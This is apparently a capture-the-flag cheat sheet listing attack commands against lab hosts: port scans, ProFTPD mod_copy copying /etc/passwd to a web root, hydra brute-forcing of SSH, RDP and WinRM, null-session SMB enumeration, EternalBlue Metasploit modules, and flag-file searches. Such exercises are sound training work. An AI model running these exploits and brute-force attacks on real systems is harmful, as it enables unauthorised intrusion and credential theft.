# Quick Reference Guide

## Network Scanning
```bash
# Full port scan with service detection
nmap -sV -sC -p- 10.12.0.42

# UDP scan
nmap -sU --top-ports 1000 10.12.0.42
```

## Service Enumeration

### FTP (10.12.0.42)
```bash
# Connect and enumerate
ftp 10.12.0.42
# Try: anonymous/anonymous, ftp/ftp, or empty credentials

# Exploit ProFTPD mod_copy
python3 proftpd_exploit.py 10.12.0.42

# Manual mod_copy test
ftp 10.12.0.42
SITE CPFR /etc/passwd
SITE CPTO /var/www/html/passwd.txt
```

### HTTP/Web Services
```bash
# Directory brute forcing
gobuster dir -u http://10.12.0.42 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
gobuster dir -u http://10.12.0.111:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster dir -u http://10.12.0.194 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Nikto scan
nikto -h http://10.12.0.42
nikto -h http://10.12.0.111:8080

# Check for common files
curl http://10.12.0.42/flag.txt
curl http://10.12.0.42/flag
curl http://10.12.0.42/robots.txt
```

### SMB (10.12.0.111)
```bash
# List shares
smbclient -L //10.12.0.111 -N

# Connect to share
smbclient //10.12.0.111/sharename -N

# Full enumeration
enum4linux -a 10.12.0.111

# Check for null session
rpcclient -U "" -N 10.12.0.111
```

### SSH
```bash
# Brute force
hydra -L users.txt -P passwords.txt ssh://10.12.0.42
hydra -L users.txt -P passwords.txt ssh://10.12.0.194

# Connect
ssh user@10.12.0.42
```

### RDP (10.12.0.136)
```bash
# Brute force
hydra -L users.txt -P passwords.txt rdp://10.12.0.136

# Connect
xfreerdp /v:10.12.0.136 /u:username /p:password
rdesktop 10.12.0.136
```

### WinRM (10.12.0.111)
```bash
# Brute force
hydra -L users.txt -P passwords.txt winrm://10.12.0.111

# Connect with evil-winrm
evil-winrm -i 10.12.0.111 -u username -p password
```

## Information Services (10.12.0.136)
```bash
# QOTD (already found flag)
telnet 10.12.0.136 17
nc 10.12.0.136 17

# Daytime
telnet 10.12.0.136 13

# Echo
telnet 10.12.0.136 7
```

## Post-Exploitation

### Linux
```bash
# Find flag files
find / -name "flag*" 2>/dev/null
find / -name "*flag*" 2>/dev/null
grep -r "CSEC-" / 2>/dev/null

# Check common locations
cat /flag.txt
cat /root/flag.txt
cat /home/*/flag.txt
cat /var/www/html/flag.txt
```

### Windows
```powershell
# Find flag files
Get-ChildItem -Path C:\ -Recurse -Filter "*flag*" -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users -Recurse -Filter "*flag*" -ErrorAction SilentlyContinue

# Check common locations
type C:\flag.txt
type C:\Users\*\flag.txt
type C:\Users\*\Desktop\flag.txt
```

## Useful Wordlists
```bash
# Common usernames
/usr/share/wordlists/metasploit/common_users.txt
/usr/share/seclists/Usernames/Names/names.txt

# Common passwords
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/metasploit/common_passwords.txt
```

## Metasploit Modules
```bash
# ProFTPD mod_copy
use exploit/unix/ftp/proftpd_modcopy_exec

# SMB exploits
use exploit/windows/smb/ms17_010_eternalblue
use auxiliary/scanner/smb/smb_login

# RDP exploits
use auxiliary/scanner/rdp/rdp_scanner
```

## Notes
- Always check for flag files after getting access
- Look for privilege escalation opportunities
- Document all methods used
- Be careful not to lock yourself out
